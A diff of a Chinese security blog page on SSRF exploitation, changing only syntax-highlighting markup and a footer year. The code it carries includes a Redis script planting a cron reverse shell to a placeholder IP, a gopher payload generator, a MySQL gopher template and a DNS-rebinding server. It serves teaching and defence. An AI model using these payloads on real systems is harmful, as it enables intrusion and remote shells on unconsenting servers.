@@ -251,11 +251,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -e <span class="s2">&#34;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0 &gt;&amp;1\n\n&#34;</span><span class="p">|</span>redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> -x <span class="nb">set</span> <span class="m">1</span>
-redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dir /var/spool/cron
-redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dbfilename root
-redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0 &gt;&amp;1\n\n&#34;</span><span class="p">|</span>redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> -x <span class="nb">set</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dir /var/spool/cron
+</span></span><span class="line"><span class="cl">redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dbfilename root
+</span></span><span class="line"><span class="cl">redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行：./shell.sh 127.0.0.1 4444</p>
 <p><strong>流量转发</strong></p>
@@ -264,8 +264,8 @@ redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat -v tcp-listen:4444,fork tcp-connect:IP:6379
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat -v tcp-listen:4444,fork tcp-connect:IP:6379
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -306,33 +306,33 @@ redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding: utf-8</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="n">exp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
-        <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="s1">&#39;&gt;&lt;+&#39;</span><span class="p">:</span>
-            <span class="k">continue</span>
-        <span class="c1"># 判断倒数第 2、3 字符串是否为 \r</span>
-        <span class="k">elif</span> <span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">:</span>
-            <span class="c1"># 如果该行只有 \r，将 \r 替换成 %0a%0d%0a</span>
-            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
-                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a%0d%0a</span><span class="s1">&#39;</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%0d%0a</span><span class="s1">&#39;</span><span class="p">)</span>
-                <span class="c1"># 去掉最后的换行符</span>
-                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
-                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
-        <span class="c1"># 判断是否是空行，空行替换为 %0a</span>
-        <span class="k">elif</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">:</span>
-            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a</span><span class="s1">&#39;</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
-            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
-<span class="nb">print</span> <span class="n">exp</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding: utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="s1">&#39;&gt;&lt;+&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 判断倒数第 2、3 字符串是否为 \r</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 如果该行只有 \r，将 \r 替换成 %0a%0d%0a</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a%0d%0a</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%0d%0a</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 去掉最后的换行符</span>
+</span></span><span class="line"><span class="cl">                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 判断是否是空行，空行替换为 %0a</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">exp</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="232-gopher-对-mysql-的利用">2.3.2 Gopher 对 Mysql 的利用</h4>
 <p>前提：</p>
@@ -351,13 +351,13 @@ redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">gopher://127.0.0.1:3306/_
-+ url 编码的登录请求
-+ 包长度(wireshark 抓包时可以直接看到 Packet Length)
-+ %00%00%00%03
-+ 查询语句(URL 编码)
-+ %01%00%00%00%01
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:3306/_
+</span></span><span class="line"><span class="cl">+ url 编码的登录请求
+</span></span><span class="line"><span class="cl">+ 包长度(wireshark 抓包时可以直接看到 Packet Length)
+</span></span><span class="line"><span class="cl">+ %00%00%00%03
+</span></span><span class="line"><span class="cl">+ 查询语句(URL 编码)
+</span></span><span class="line"><span class="cl">+ %01%00%00%00%01
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="233-相关工具">2.3.3 相关工具</h4>
 <p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreffer">https://github.com/tarunkant/Gopherus</a></p>
@@ -489,56 +489,56 @@ redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
 </span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
-<span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
-
-<span class="n">record</span><span class="o">=</span><span class="p">{}</span>
-
-<span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-
-    <span class="k">def</span> <span class="nf">_doDynamicResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
-        <span class="n">name</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">name</span>
-
-        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span> <span class="ow">or</span> <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
-            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;1.2.3.4&#34;</span>
-
-        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span><span class="p">:</span>
-            <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>
-        <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">+=</span><span class="mi">1</span>
-
-        <span class="nb">print</span> <span class="n">name</span><span class="o">+</span><span class="s2">&#34; ===&gt; &#34;</span><span class="o">+</span><span class="n">ip</span>
-
-        <span class="n">answer</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">RRHeader</span><span class="p">(</span>
-            <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span>
-            <span class="nb">type</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
-            <span class="bp">cls</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
-            <span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
-            <span class="n">payload</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">Record_A</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">ip</span><span class="p">,</span><span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
-        <span class="p">)</span>
-        <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">answer</span><span class="p">]</span>
-        <span class="n">authority</span> <span class="o">=</span> <span class="p">[]</span>
-        <span class="n">additional</span> <span class="o">=</span> <span class="p">[]</span>
-        <span class="k">return</span> <span class="n">answers</span><span class="p">,</span> <span class="n">authority</span><span class="p">,</span> <span class="n">additional</span>
-
-    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
-        <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">succeed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_doDynamicResponse</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">factory</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">DNSServerFactory</span><span class="p">(</span>
-        <span class="n">clients</span><span class="o">=</span><span class="p">[</span><span class="n">DynamicResolver</span><span class="p">(),</span> <span class="n">client</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">resolv</span><span class="o">=</span><span class="s1">&#39;/etc/resolv.conf&#39;</span><span class="p">)]</span>
-    <span class="p">)</span>
-
-    <span class="n">protocol</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">DNSDatagramProtocol</span><span class="p">(</span><span class="n">controller</span><span class="o">=</span><span class="n">factory</span><span class="p">)</span>
-    <span class="n">reactor</span><span class="o">.</span><span class="n">listenUDP</span><span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="n">protocol</span><span class="p">)</span>
-    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
-
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">record</span><span class="o">=</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_doDynamicResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">name</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span> <span class="ow">or</span> <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;1.2.3.4&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">name</span><span class="o">+</span><span class="s2">&#34; ===&gt; &#34;</span><span class="o">+</span><span class="n">ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">answer</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">RRHeader</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">type</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">cls</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">Record_A</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">ip</span><span class="p">,</span><span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">answer</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">authority</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">additional</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">answers</span><span class="p">,</span> <span class="n">authority</span><span class="p">,</span> <span class="n">additional</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">succeed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_doDynamicResponse</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">factory</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">DNSServerFactory</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clients</span><span class="o">=</span><span class="p">[</span><span class="n">DynamicResolver</span><span class="p">(),</span> <span class="n">client</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">resolv</span><span class="o">=</span><span class="s1">&#39;/etc/resolv.conf&#39;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">protocol</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">DNSDatagramProtocol</span><span class="p">(</span><span class="n">controller</span><span class="o">=</span><span class="n">factory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reactor</span><span class="o">.</span><span class="n">listenUDP</span><span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="n">protocol</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="243-防御方法">2.4.3 防御方法</h4>
 <p>通过控制两次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。</p>
@@ -571,7 +571,7 @@ redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
